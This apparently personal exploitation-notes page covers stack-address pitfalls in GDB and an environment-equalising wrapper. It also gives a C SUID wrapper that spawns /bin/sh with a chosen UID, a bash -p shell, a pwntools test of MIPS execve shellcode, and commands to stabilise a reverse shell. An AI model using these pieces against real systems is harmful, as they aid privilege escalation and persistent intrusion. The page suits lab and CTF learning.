---
title: Tips & Tricks
---

## Problems

### Environment Variables

When debugging, GDB adds two environment variables:

- `LINES`
- `COLUMNS`

Because environment variables are placed on the stack when the program is executed, they can cause address changes when attempting to exploit a vulnerability, due to the additional data on the stack.

To avoid this, remove them to prevent headaches:

```sh
(gdb) unset env LINES
(gdb) unset env COLUMNS
```

### Arguments

You can call a program in multiple ways, for example:

```c
./my_programm               // Relative
/absolute/path/my_programm  // Absolute
```

However, **these are NOT the same thing**.

When calling a program, the way you invoke it (its name) is stored in argv[0], which is on the stack.

> **To quote StackOverflow**
>
> One further subtle but important detail: there's a difference between calling `./stack` and `/path/to/stack`: since `argv[0]` holds the program exactly how you invoked it, you need to ensure equal invocation strings. That's why I used `/path/to/stack` in the above examples and not just `./stack` and `gdb stack`.

## Executable Wrapper

When learning to exploit with memory safety vulnerabilities, I recommend using the wrapper program below, which does the heavy lifting and ensures equal stack offsets :

```sh {linenos=table,filename="invoke"}
#!/bin/sh
# https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it

while getopts "dte:h?" opt ; do
  case "$opt" in
    h|\?)
      printf "usage: %s -e KEY=VALUE prog [args...]\n" $(basename $0)
      exit 0
      ;;
    t)
      tty=1
      gdb=1
      ;;
    d)
      gdb=1
      ;;
    e)
      env=$OPTARG
      ;;
  esac
done

shift $(expr $OPTIND - 1)
prog=$(readlink -f $1)
shift
if [ -n "$gdb" ] ; then
  if [ -n "$tty" ]; then
    touch /tmp/gdb-debug-pty
    exec env - $env TERM=screen PWD=$PWD gdb -tty /tmp/gdb-debug-pty --args $prog "$@"
  else
    exec env - $env TERM=screen PWD=$PWD gdb --args $prog "$@"
  fi
else
  exec env - $env TERM=screen PWD=$PWD $prog "$@"
fi
```

```sh {filename="Terminal - /bin/bash"}
invoke stack         # just call the executable
invoke -d stack      # run the executable in GDB
```

You can also ensure the environment variables are the same by calling GDB and your program the same way :

```sh
env -i PWD="/root/Documents/MSec" SHELL="/bin/bash" SHLVL=0 /root/Documents/MSec/shelltest
env -i PWD="/root/Documents/MSec" SHELL="/bin/bash" SHLVL=0 gdb /root/Documents/MSec/shelltest
```

## SUID Wrapper

Modern versions of **bash** and **tcsh** automatically check if the **process's UID** matches its **EUID** when they start. If they don’t match, the shell resets the **EUID to the UID** as a security measure.

However, this limitation can be bypassed by using a **wrapper program** that calls `setuid(0)` to regain root privileges before launching the shell.

### C Code

The following is the C code for such a wrapper :

```c {linenos=table,filename="suid_wrapper.c"}
#include <unistd.h>

int main(){
    char *name[]={"/bin/sh",NULL};
    unsigned int id = 1246;  // Change to the ID of the target user
    setuid(id);
    setgid(id);
    setreuid(id, id);
    execve(name[0], name, NULL);
}
```

### Shell

As well as the following bash script :

```sh
#!/bin/bash -p
/bin/bash -p
```


## Test Shellcode

```python {linenos=table,filename="test_shellcode.py"}
from pwn import *

# Change architecture accordingly
context.update(arch='mips', os='linux', bits=32, endian='big')

# Change actual shellcode to your needs
shellcode = asm('''
  lui $t7, 0x2f2f
  ori $t7, $t7,0x6269
  lui $t6, 0x6e2f
  ori $t6, $t6, 0x7368
  sw $t7, -12($sp)
  sw $t6, -8($sp)
  sw $zero, -4($sp)
  addiu $a0, $sp, -12
  slti $a1, $zero, -1
  slti $a2, $zero, -1
  li $v0, 4011
  syscall 0x040405
''')

filename = make_elf(shellcode, extract=False)
p = process(filename)
p.interactive()
```

## Helpers

## Stabilize reverse shell

```sh
SHELL=/bin/bash script -q /dev/null
# Ctrl-Z
stty raw -echo
fg
reset
xterm
```

or

```sh
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm; export SHELL=/bin/bash
# CTRL+Z
stty raw -echo;fg
```
